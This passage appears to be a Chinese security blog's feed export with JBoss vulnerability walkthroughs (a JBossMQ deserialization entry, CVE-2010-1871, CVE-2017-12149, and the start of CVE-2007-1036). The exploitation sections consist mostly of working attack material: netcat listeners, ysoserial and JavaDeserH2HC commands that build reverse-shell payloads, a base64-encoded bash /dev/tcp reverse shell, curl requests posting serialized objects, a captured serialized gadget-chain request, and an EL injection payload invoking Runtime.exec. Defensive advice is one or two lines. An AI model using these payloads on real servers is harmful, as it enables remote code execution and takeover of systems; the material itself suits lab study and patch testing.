<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvnp 8888</span><br></pre></td></tr></table></figure>

<p>下载JavaDeserH2HC工具</p>
<p><a href="https://github.com/joaomatosf/JavaDeserH2HC">https://github.com/joaomatosf/JavaDeserH2HC</a></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">javac -cp .:commons-collections-<span class="number">3.2</span><span class="number">.1</span>.jar ReverseShellCommonsCollectionsHashMap.java</span><br><span class="line">java -cp .:commons-collections-<span class="number">3.2</span><span class="number">.1</span>.jar ReverseShellCommonsCollectionsHashMap <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">8888</span></span><br><span class="line">curl http:<span class="comment">//127.0.0.1:8080/jbossmq-httpil/HTTPServerILServlet --data-binary @ReverseShellCommonsCollectionsHashMap.ser</span></span><br></pre></td></tr></table></figure>

<p>也可以使用<code>ysoserial.jar</code>工具</p>
<p><a href="https://github.com/frohoff/ysoserial">https://github.com/frohoff/ysoserial</a></p>
<p>这里命令是<code>bash -i &gt;&amp; /dev/tcp/127.0.0.1/8888 0&gt;&amp;1</code>，需要先进行编码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">java  -jar  ysoserial.jar  CommonsCollections1 <span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvODg4OCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span> &gt; jboss.ser</span><br><span class="line">    </span><br><span class="line">curl http:<span class="comment">//127.0.0.1:8080/jbossmq-httpil/HTTPServerILServlet --data-binary @jboss.ser -x http://127.0.0.1:1080</span></span><br><span class="line">-x 是设置代理</span><br></pre></td></tr></table></figure>

<p>HTTP头部抓包</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/jbossmq-httpil/HTTPServerILServlet</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:8080</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>1630</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Expect</span><span class="punctuation">: </span>100-continue</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="xquery"><span class="meta">%ac</span><span class="meta">%ed</span>=&amp;sr=&amp;<span class="number">2</span>sun.reflect.annotation.AnnotationInvocationHandlerU<span class="meta">%ca</span><span class="meta">%f5</span>=&amp;<span class="meta">%cb</span><span class="meta">%7e</span><span class="meta">%a5</span>=&amp;L=&amp;memberValuest=&amp;Ljava<span class="meta">%2futil</span><span class="meta">%2fMap</span><span class="meta">%3bL</span>=&amp;typet=&amp;Ljava<span class="meta">%2flang</span><span class="meta">%2fClass</span><span class="meta">%3bxps</span><span class="meta">%7d</span>=&amp;java.util.Mapxr=&amp;java<span class="built_in">.lang</span>.reflect.Proxy<span class="meta">%e1</span><span class="meta">%27</span><span class="meta">%da</span>+<span class="meta">%cc</span>=&amp;C<span class="meta">%cb</span>=&amp;L=&amp;ht=&amp;<span class="meta">%25Ljava</span><span class="meta">%2flang</span><span class="meta">%2freflect</span><span class="meta">%2fInvocationHandler</span><span class="meta">%3bxpsq</span>=&amp;<span class="meta">%7e</span>=&amp;sr=&amp;*org.apache.commons.collections.<span class="keyword">map</span>.LazyMapn<span class="meta">%e5</span><span class="meta">%94</span><span class="meta">%82</span><span class="meta">%9ey</span>=&amp;<span class="meta">%94</span>=&amp;L=&amp;factoryt=&amp;<span class="meta">%2cLorg</span><span class="meta">%2fapache</span><span class="meta">%2fcommons</span><span class="meta">%2fcollections</span><span class="meta">%2fTransformer</span><span class="meta">%3bxpsr</span>=&amp;<span class="meta">%3aorg</span>.apache.commons.collections.functors.ChainedTransformer<span class="number">0</span><span class="meta">%c7</span><span class="meta">%97</span><span class="meta">%ec</span><span class="meta">%28z</span><span class="meta">%97</span>=&amp;<span class="meta">%5b</span>=&amp;iTransformerst=&amp;-<span class="meta">%5bLorg</span><span class="meta">%2fapache</span><span class="meta">%2fcommons</span><span class="meta">%2fcollections</span><span class="meta">%2fTransformer</span><span class="meta">%3bxpur</span>=&amp;-<span class="meta">%5bLorg</span>.apache.commons.collections.Transformer<span class="meta">%3b</span><span class="meta">%bdV</span>*<span class="meta">%f1</span><span class="meta">%d84</span>=&amp;<span class="meta">%99</span>=&amp;xp=&amp;sr=&amp;<span class="meta">%3borg</span>.apache.commons.collections.functors.ConstantTransformerXv<span class="meta">%90</span>=&amp;A=&amp;<span class="meta">%b1</span><span class="meta">%94</span>=&amp;L=&amp;iConstantt=&amp;Ljava<span class="meta">%2flang</span><span class="meta">%2fObject</span><span class="meta">%3bxpvr</span>=&amp;java<span class="built_in">.lang</span>.Runtime=&amp;xpsr=&amp;<span class="meta">%3aorg</span>.apache.commons.collections.functors.InvokerTransformer<span class="meta">%87</span><span class="meta">%e8</span><span class="meta">%ffk</span><span class="meta">%7b</span><span class="meta">%7c</span><span class="meta">%ce8</span>=&amp;<span class="meta">%5b</span>=&amp;iArgst=&amp;<span class="meta">%5bLjava</span><span class="meta">%2flang</span><span class="meta">%2fObject</span><span class="meta">%3bL</span>=&amp;iMethodNamet=&amp;Ljava<span class="meta">%2flang</span><span class="meta">%2fString</span><span class="meta">%3b</span><span class="meta">%5b</span>=&amp;iParamTypest=&amp;<span class="meta">%5bLjava</span><span class="meta">%2flang</span><span class="meta">%2fClass</span><span class="meta">%3bxpur</span>=&amp;<span class="meta">%5bLjava</span><span class="built_in">.lang</span>.Object<span class="meta">%3b</span><span class="meta">%90</span><span class="meta">%ceX</span><span class="meta">%9f</span>=&amp;s<span class="meta">%29l</span>=&amp;xp=&amp;t=&amp;getRuntimeur=&amp;<span class="meta">%5bLjava</span><span class="built_in">.lang</span>.Class<span class="meta">%3b</span><span class="meta">%ab</span>=&amp;<span class="meta">%d7</span><span class="meta">%ae</span><span class="meta">%cb</span><span class="meta">%cdZ</span><span class="meta">%99</span>=&amp;xp=&amp;t=&amp;getMethoduq=&amp;<span class="meta">%7e</span>=&amp;vr=&amp;java<span class="built_in">.lang</span>.String<span class="meta">%a0</span><span class="meta">%f0</span><span class="meta">%a48z</span><span class="meta">%3b</span><span class="meta">%b3B</span>=&amp;xpvq=&amp;<span class="meta">%7e</span>=&amp;sq=&amp;<span class="meta">%7e</span>=&amp;uq=&amp;<span class="meta">%7e</span>=&amp;puq=&amp;<span class="meta">%7e</span>=&amp;t=&amp;invokeuq=&amp;<span class="meta">%7e</span>=&amp;vr=&amp;java<span class="built_in">.lang</span>.Object=&amp;xpvq=&amp;<span class="meta">%7e</span>=&amp;sq=&amp;<span class="meta">%7e</span>=&amp;ur=&amp;<span class="meta">%5bLjava</span><span class="built_in">.lang</span>.String<span class="meta">%3b</span><span class="meta">%ad</span><span class="meta">%d2V</span><span class="meta">%e7</span><span class="meta">%e9</span>=&amp;<span class="meta">%7bG</span>=&amp;xp=&amp;t=&amp;&#123;这里为输入命令&#125;&amp;execuq=&amp;<span class="meta">%7e</span>=&amp;q=&amp;<span class="meta">%7e</span>=&amp;<span class="meta">%23sq</span>=&amp;<span class="meta">%7e</span>=&amp;sr=&amp;java<span class="built_in">.lang</span>.Integer=&amp;<span class="meta">%e2</span><span class="meta">%a0</span><span class="meta">%a4</span><span class="meta">%f7</span><span class="meta">%81</span><span class="meta">%878</span>=&amp;I=&amp;valuexr=&amp;java<span class="built_in">.lang</span>.Number<span class="meta">%86</span><span class="meta">%ac</span><span class="meta">%95</span>=&amp;<span class="meta">%94</span><span class="meta">%e0</span><span class="meta">%8b</span>=&amp;xp=&amp;sr=&amp;java.util.HashMap=&amp;<span class="meta">%da</span><span class="meta">%c1</span><span class="meta">%c3</span>=&amp;<span class="meta">%60</span><span class="meta">%d1</span>=&amp;F=&amp;loadFactorI=&amp;thresholdxp<span class="meta">%3f</span>@=&amp;w=&amp;xxvr=&amp;java<span class="built_in">.lang</span>.Override=&amp;xpq=&amp;<span class="meta">%7e</span>=&amp;<span class="meta">%3a</span>=</span></span><br></pre></td></tr></table></figure>



<h2 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h2><ol>
<li>升级JBoss版本</li>
</ol>
]]></content>
      <categories>
        <category>漏洞利用</category>
        <category>Web服务器漏洞</category>
        <category>常规漏洞</category>
        <category>JBoss</category>
        <category>反序列化漏洞</category>
      </categories>
      <tags>
        <tag>反序列化漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>JBoss seam2模板注入漏洞 - CVE-2010-1871</title>
    <url>//73208a942d69.html</url>
    <content><![CDATA[<h2 id="JBoss简介"><a href="#JBoss简介" class="headerlink" title="JBoss简介"></a>JBoss简介</h2><p>​        Jboss是一个基于J2EE的开放源代码的应用服务器。JBoss代码遵循LGPL许可，可以在任何商业应用中免费使用。JBoss是一个管理EJB的容器和服务器，支持EJB 1.1、EJB 2.0和EJB3的规范。但JBoss核心服务不包括支持servlet/JSP的WEB容器，一般与Tomcat或Jetty绑定使用。</p>
<p>默认端口：8080</p>
<p>下载地址：<a href="https://jbossas.jboss.org/downloads/">https://jbossas.jboss.org/downloads/</a></p>
<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p><code>JBossSeam</code>是一个<code>JavaEE5</code>框架，把<code>JSF</code>与<code>EJB 3.0</code>组件合并在一起，从而为开发基于Web的企业应用程序提供一个最新的模式。</p>
<p><code>JBossSeam</code>处理某些参数化<code>JBossEL</code>表达式的方式存在输入过滤漏洞。如果远程攻击者能够诱骗通过认证的<code>JBossSeam</code>用户访问特制的网页，就可能导致执行任意代码。</p>
<p>漏洞是通过<code>seam</code>组件中插入<code>#&#123;payload&#125;</code>进行模板注入，通过Java反射机制来获取到（<code>Java.lang.Runtime.getRuntime().exec()</code>方法），从而可以传入任何想要执行的命令。</p>
<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>JBoss应用服务器：</p>
<p>JBoss AS = 4.3.0（企业版）</p>
<h2 id="环境复现"><a href="#环境复现" class="headerlink" title="环境复现"></a>环境复现</h2><p>java环境：JDK 6</p>
<p>在官网下载相应的JBoss版本</p>
<p>配置环境变量</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JBOSS_HOME</span><br><span class="line">C:\xxx（JBoss安装地址）</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PATH</span><br><span class="line">;%JBOSS_HOME%\bin;</span><br></pre></td></tr></table></figure>

<p>外网访问</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JBoss6: \server\default\deploy\jbossweb.sar\server.xml</span><br><span class="line">JBoss4: \server\default\deploy\jboss-web.deployer\server.xml</span><br><span class="line"></span><br><span class="line">将address=&quot;$&#123;jboss.bind.address&#125;&quot;改成address=&quot;0.0.0.0&quot;</span><br></pre></td></tr></table></figure>

<p>启动</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JBoss\bin\run.bat</span><br><span class="line"></span><br><span class="line">访问http://127.0.0.1:8080</span><br></pre></td></tr></table></figure>



<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p><strong>JBoss漏洞检测</strong></p>
<ol>
<li>JBoss漏洞检测工具下载</li>
</ol>
<p><a href="https://github.com/fupinglee/JavaTools/tree/master/JBoss">https://github.com/fupinglee/JavaTools/tree/master/JBoss</a></p>
<ol start="2">
<li>先探测是否具有JBoss服务</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app=&quot;jboss&quot;</span><br></pre></td></tr></table></figure>

<p>根据HTTP头部</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"># http头部显示jboss服务和版本信息</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>JBoss-EAP/7</span><br><span class="line"># http头部显示，Apache-Coyote 是Tomcat的连接器，被多个Java servlet容器使用作为socket处理组件，有tomcat，jboss等</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>Apache-Coyote/1.1</span><br><span class="line"># X-Powered-By</span><br><span class="line"><span class="attribute">X-Powered-By</span><span class="punctuation">: </span>Servlet 2.4; JBoss-4.2.3.GA</span><br></pre></td></tr></table></figure>



<p>访问如下URL</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8080/admin-console/login.seam</span><br></pre></td></tr></table></figure>

<p>cmd代表传入的远程命令。在<code>/admin-console/login.seam</code>路径下，POST传入构造好的<code>payload</code>，即可对此漏洞利用。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">actionOutcome=/success.xhtml?user=#&#123;expressions.getClass().forName(<span class="string">&#x27;Java.lang.Runtime&#x27;</span>).getDeclaredMethod(<span class="string">&#x27;getRuntime&#x27;</span>).invoke(expressions.getClass().forName(<span class="string">&#x27;Java.lang.Runtime&#x27;</span>)).exec(cmd)&#125;</span><br></pre></td></tr></table></figure>



<h2 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h2><p>下载补丁</p>
]]></content>
      <categories>
        <category>漏洞利用</category>
        <category>Web服务器漏洞</category>
        <category>常规漏洞</category>
        <category>JBoss</category>
        <category>注入漏洞</category>
      </categories>
      <tags>
        <tag>注入漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>JBoss反序列化漏洞 - CVE-2017-12149</title>
    <url>//0c25934b8fe9.html</url>
    <content><![CDATA[<h1 id="JBoss反序列化漏洞-CVE-2017-12149"><a href="#JBoss反序列化漏洞-CVE-2017-12149" class="headerlink" title="JBoss反序列化漏洞 - CVE-2017-12149"></a>JBoss反序列化漏洞 - CVE-2017-12149</h1><h2 id="JBoss简介"><a href="#JBoss简介" class="headerlink" title="JBoss简介"></a>JBoss简介</h2><p>​        Jboss是一个基于J2EE的开放源代码的应用服务器。JBoss代码遵循LGPL许可，可以在任何商业应用中免费使用。JBoss是一个管理EJB的容器和服务器，支持EJB 1.1、EJB 2.0和EJB3的规范。但JBoss核心服务不包括支持servlet/JSP的WEB容器，一般与Tomcat或Jetty绑定使用。</p>
<p>默认端口：8080</p>
<p>下载地址：<a href="https://jbossas.jboss.org/downloads/">https://jbossas.jboss.org/downloads/</a></p>
<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>此漏洞主要是由于 <code>jboss\server\all\deploy\httpha-invoker.sar\invoker.war\WEB-INF\classes\org\jboss\invocation\http\servlet</code> 目录下的 <code>ReadOnlyAccessFilter.class</code> 文件中的 <code>doFilter</code> 方法，再将序列化传入 <code>ois</code> 中，并没有进行过滤便调用了 <code>readObject()</code> 进行反序列化，导致传入的携带恶意代码的序列化数据执行，造成了反序列化的漏洞。</p>
<p>该漏洞存在于JBoss AS的<code>HttpInvoker</code> 组件中的<code>ReadOnlyAccessFilter</code> 过滤器中。该过滤器在没有进行任何安全检查的情况下尝试将来自客户端的数据流进行反序列化，从而导致了漏洞。</p>
<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>JBoss应用服务器：</p>
<ul>
<li>JBoss AS 5.x</li>
<li>JBoss AS 6.x</li>
</ul>
<h2 id="环境复现"><a href="#环境复现" class="headerlink" title="环境复现"></a>环境复现</h2><p>java环境：JDK 6</p>
<p>在官网下载相应的JBoss版本</p>
<p>配置环境变量</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JBOSS_HOME</span><br><span class="line">C:\xxx（JBoss安装地址）</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PATH</span><br><span class="line">;%JBOSS_HOME%\bin;</span><br></pre></td></tr></table></figure>

<p>外网访问</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JBoss6: \server\default\deploy\jbossweb.sar\server.xml</span><br><span class="line">JBoss4: \server\default\deploy\jboss-web.deployer\server.xml</span><br><span class="line"></span><br><span class="line">将address=&quot;$&#123;jboss.bind.address&#125;&quot;改成address=&quot;0.0.0.0&quot;</span><br></pre></td></tr></table></figure>

<p>启动</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JBoss\bin\run.bat</span><br><span class="line"></span><br><span class="line">访问http://127.0.0.1:8080</span><br></pre></td></tr></table></figure>



<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p><strong>JBoss漏洞检测</strong></p>
<ol>
<li>JBoss漏洞检测工具下载</li>
</ol>
<p><a href="https://github.com/fupinglee/JavaTools/tree/master/JBoss">https://github.com/fupinglee/JavaTools/tree/master/JBoss</a></p>
<ol start="2">
<li>先探测是否具有JBoss服务</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app=&quot;jboss&quot;</span><br></pre></td></tr></table></figure>

<p>根据HTTP头部</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"># http头部显示jboss服务和版本信息</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>JBoss-EAP/7</span><br><span class="line"># http头部显示，Apache-Coyote 是Tomcat的连接器，被多个Java servlet容器使用作为socket处理组件，有tomcat，jboss等</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>Apache-Coyote/1.1</span><br><span class="line"># X-Powered-By</span><br><span class="line"><span class="attribute">X-Powered-By</span><span class="punctuation">: </span>Servlet 2.4; JBoss-4.2.3.GA</span><br></pre></td></tr></table></figure>



<p>访问如下URL,如果返回500错误，则存在漏洞</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8080/invoker/readonly</span><br></pre></td></tr></table></figure>

<p>监听端口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvnp 8888</span><br></pre></td></tr></table></figure>

<p>下载JavaDeserH2HC工具</p>
<p><a href="https://github.com/joaomatosf/JavaDeserH2HC">https://github.com/joaomatosf/JavaDeserH2HC</a></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">javac -cp .:commons-collections-<span class="number">3.2</span><span class="number">.1</span>.jar ReverseShellCommonsCollectionsHashMap.java</span><br><span class="line">java -cp .:commons-collections-<span class="number">3.2</span><span class="number">.1</span>.jar ReverseShellCommonsCollectionsHashMap <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">8888</span></span><br><span class="line">curl http:<span class="comment">//127.0.0.1:8080/invoker/readonly --data-binary @ReverseShellCommonsCollectionsHashMap.ser</span></span><br></pre></td></tr></table></figure>

<p>也可以使用<code>ysoserial.jar</code>工具</p>
<p><a href="https://github.com/frohoff/ysoserial">https://github.com/frohoff/ysoserial</a></p>
<p>这里命令是<code>bash -i &gt;&amp; /dev/tcp/127.0.0.1/8888 0&gt;&amp;1</code>，需要先进行编码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">java  -jar  ysoserial.jar  CommonsCollections1 <span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvODg4OCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span> &gt; jboss.ser</span><br><span class="line">    </span><br><span class="line">curl http:<span class="comment">//127.0.0.1:8080/invoker/readonly --data-binary @jboss.ser -x http://127.0.0.1:1080</span></span><br><span class="line">-x 是设置代理</span><br></pre></td></tr></table></figure>

<p>HTTP头部抓包</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/invoker/readonly</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:8080</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>1630</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Expect</span><span class="punctuation">: </span>100-continue</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="xquery"><span class="meta">%ac</span><span class="meta">%ed</span>=&amp;sr=&amp;<span class="number">2</span>sun.reflect.annotation.AnnotationInvocationHandlerU<span class="meta">%ca</span><span class="meta">%f5</span>=&amp;<span class="meta">%cb</span><span class="meta">%7e</span><span class="meta">%a5</span>=&amp;L=&amp;memberValuest=&amp;Ljava<span class="meta">%2futil</span><span class="meta">%2fMap</span><span class="meta">%3bL</span>=&amp;typet=&amp;Ljava<span class="meta">%2flang</span><span class="meta">%2fClass</span><span class="meta">%3bxps</span><span class="meta">%7d</span>=&amp;java.util.Mapxr=&amp;java<span class="built_in">.lang</span>.reflect.Proxy<span class="meta">%e1</span><span class="meta">%27</span><span class="meta">%da</span>+<span class="meta">%cc</span>=&amp;C<span class="meta">%cb</span>=&amp;L=&amp;ht=&amp;<span class="meta">%25Ljava</span><span class="meta">%2flang</span><span class="meta">%2freflect</span><span class="meta">%2fInvocationHandler</span><span class="meta">%3bxpsq</span>=&amp;<span class="meta">%7e</span>=&amp;sr=&amp;*org.apache.commons.collections.<span class="keyword">map</span>.LazyMapn<span class="meta">%e5</span><span class="meta">%94</span><span class="meta">%82</span><span class="meta">%9ey</span>=&amp;<span class="meta">%94</span>=&amp;L=&amp;factoryt=&amp;<span class="meta">%2cLorg</span><span class="meta">%2fapache</span><span class="meta">%2fcommons</span><span class="meta">%2fcollections</span><span class="meta">%2fTransformer</span><span class="meta">%3bxpsr</span>=&amp;<span class="meta">%3aorg</span>.apache.commons.collections.functors.ChainedTransformer<span class="number">0</span><span class="meta">%c7</span><span class="meta">%97</span><span class="meta">%ec</span><span class="meta">%28z</span><span class="meta">%97</span>=&amp;<span class="meta">%5b</span>=&amp;iTransformerst=&amp;-<span class="meta">%5bLorg</span><span class="meta">%2fapache</span><span class="meta">%2fcommons</span><span class="meta">%2fcollections</span><span class="meta">%2fTransformer</span><span class="meta">%3bxpur</span>=&amp;-<span class="meta">%5bLorg</span>.apache.commons.collections.Transformer<span class="meta">%3b</span><span class="meta">%bdV</span>*<span class="meta">%f1</span><span class="meta">%d84</span>=&amp;<span class="meta">%99</span>=&amp;xp=&amp;sr=&amp;<span class="meta">%3borg</span>.apache.commons.collections.functors.ConstantTransformerXv<span class="meta">%90</span>=&amp;A=&amp;<span class="meta">%b1</span><span class="meta">%94</span>=&amp;L=&amp;iConstantt=&amp;Ljava<span class="meta">%2flang</span><span class="meta">%2fObject</span><span class="meta">%3bxpvr</span>=&amp;java<span class="built_in">.lang</span>.Runtime=&amp;xpsr=&amp;<span class="meta">%3aorg</span>.apache.commons.collections.functors.InvokerTransformer<span class="meta">%87</span><span class="meta">%e8</span><span class="meta">%ffk</span><span class="meta">%7b</span><span class="meta">%7c</span><span class="meta">%ce8</span>=&amp;<span class="meta">%5b</span>=&amp;iArgst=&amp;<span class="meta">%5bLjava</span><span class="meta">%2flang</span><span class="meta">%2fObject</span><span class="meta">%3bL</span>=&amp;iMethodNamet=&amp;Ljava<span class="meta">%2flang</span><span class="meta">%2fString</span><span class="meta">%3b</span><span class="meta">%5b</span>=&amp;iParamTypest=&amp;<span class="meta">%5bLjava</span><span class="meta">%2flang</span><span class="meta">%2fClass</span><span class="meta">%3bxpur</span>=&amp;<span class="meta">%5bLjava</span><span class="built_in">.lang</span>.Object<span class="meta">%3b</span><span class="meta">%90</span><span class="meta">%ceX</span><span class="meta">%9f</span>=&amp;s<span class="meta">%29l</span>=&amp;xp=&amp;t=&amp;getRuntimeur=&amp;<span class="meta">%5bLjava</span><span class="built_in">.lang</span>.Class<span class="meta">%3b</span><span class="meta">%ab</span>=&amp;<span class="meta">%d7</span><span class="meta">%ae</span><span class="meta">%cb</span><span class="meta">%cdZ</span><span class="meta">%99</span>=&amp;xp=&amp;t=&amp;getMethoduq=&amp;<span class="meta">%7e</span>=&amp;vr=&amp;java<span class="built_in">.lang</span>.String<span class="meta">%a0</span><span class="meta">%f0</span><span class="meta">%a48z</span><span class="meta">%3b</span><span class="meta">%b3B</span>=&amp;xpvq=&amp;<span class="meta">%7e</span>=&amp;sq=&amp;<span class="meta">%7e</span>=&amp;uq=&amp;<span class="meta">%7e</span>=&amp;puq=&amp;<span class="meta">%7e</span>=&amp;t=&amp;invokeuq=&amp;<span class="meta">%7e</span>=&amp;vr=&amp;java<span class="built_in">.lang</span>.Object=&amp;xpvq=&amp;<span class="meta">%7e</span>=&amp;sq=&amp;<span class="meta">%7e</span>=&amp;ur=&amp;<span class="meta">%5bLjava</span><span class="built_in">.lang</span>.String<span class="meta">%3b</span><span class="meta">%ad</span><span class="meta">%d2V</span><span class="meta">%e7</span><span class="meta">%e9</span>=&amp;<span class="meta">%7bG</span>=&amp;xp=&amp;t=&amp;&#123;这里为输入命令&#125;&amp;execuq=&amp;<span class="meta">%7e</span>=&amp;q=&amp;<span class="meta">%7e</span>=&amp;<span class="meta">%23sq</span>=&amp;<span class="meta">%7e</span>=&amp;sr=&amp;java<span class="built_in">.lang</span>.Integer=&amp;<span class="meta">%e2</span><span class="meta">%a0</span><span class="meta">%a4</span><span class="meta">%f7</span><span class="meta">%81</span><span class="meta">%878</span>=&amp;I=&amp;valuexr=&amp;java<span class="built_in">.lang</span>.Number<span class="meta">%86</span><span class="meta">%ac</span><span class="meta">%95</span>=&amp;<span class="meta">%94</span><span class="meta">%e0</span><span class="meta">%8b</span>=&amp;xp=&amp;sr=&amp;java.util.HashMap=&amp;<span class="meta">%da</span><span class="meta">%c1</span><span class="meta">%c3</span>=&amp;<span class="meta">%60</span><span class="meta">%d1</span>=&amp;F=&amp;loadFactorI=&amp;thresholdxp<span class="meta">%3f</span>@=&amp;w=&amp;xxvr=&amp;java<span class="built_in">.lang</span>.Override=&amp;xpq=&amp;<span class="meta">%7e</span>=&amp;<span class="meta">%3a</span>=</span></span><br></pre></td></tr></table></figure>



<h2 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h2><ol>
<li><p>删除<code>http-invoker.sar</code>组件</p>
</li>
<li><p>设置<code>http-invoker</code></p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jboss\server\default\deploy\http-invoker.sar\invoker.war\WEB-INF\web.xml</span><br><span class="line"></span><br><span class="line">在security-constraint 标签中添加以下代码</span><br><span class="line">&lt;url-pattern&gt;/*&lt;/url-pattern&gt;</span><br></pre></td></tr></table></figure></li>
<li><p>升级JBoss版本</p>
</li>
</ol>
]]></content>
      <categories>
        <category>漏洞利用</category>
        <category>Web服务器漏洞</category>
        <category>常规漏洞</category>
        <category>JBoss</category>
        <category>反序列化漏洞</category>
      </categories>
      <tags>
        <tag>反序列化漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>JBoss后台文件上传漏洞 - CVE-2007-1036</title>
    <url>//013bc4e5df03.html</url>
    <content><![CDATA[<h2 id="JBoss简介"><a href="#JBoss简介" class="headerlink" title="JBoss简介"></a>JBoss简介</h2><p>​        Jboss是一个基于J2EE的开放源代码的应用服务器。JBoss代码遵循LGPL许可，可以在任何商业应用中免费使用。JBoss是一个管理EJB的容器和服务器，支持EJB 1.1、EJB 2.0和EJB3的规范。但JBoss核心服务不包括支持servlet/JSP的WEB容器，一般与Tomcat或Jetty绑定使用。</p>
<p>默认端口：8080</p>
<p>下载地址：<a href="https://jbossas.jboss.org/downloads/">https://jbossas.jboss.org/downloads/</a></p>
<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>​        此漏洞主要是由于JBoss中<code>/jmx-console/HtmlAdaptor</code>路径对外开放，并且没有任何身份验证机制，导致攻击者可以进入到jmx控制台，并在其中执行任何功能。该漏洞利用的是后台中<code>jboss.admin -&gt; DeploymentFileRepository -&gt; store()</code>方法，通过向四个参数传入信息，达到上传shell的目的，其中arg0传入的是部署的war包名字，arg1传入的是上传的文件的文件名，arg2传入的是上传文件的文件格式，arg3传入的是上传文件中的内容。通过控制这四个参数即可上传shell，控制整台服务器。</p>
<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>JBoss应用服务器：</p>
<p>全版本</p>
<h2 id="环境复现"><a href="#环境复现" class="headerlink" title="环境复现"></a>环境复现</h2><p>java环境：JDK 8以下</p>
<p>在官网下载相应的JBoss版本</p>
<p>配置环境变量</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JBOSS_HOME</span><br><span class="line">C:\xxx（JBoss安装地址）</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PATH</span><br><span class="line">;%JBOSS_HOME%\bin;</span><br></pre></td></tr></table></figure>

<p>外网访问</p>
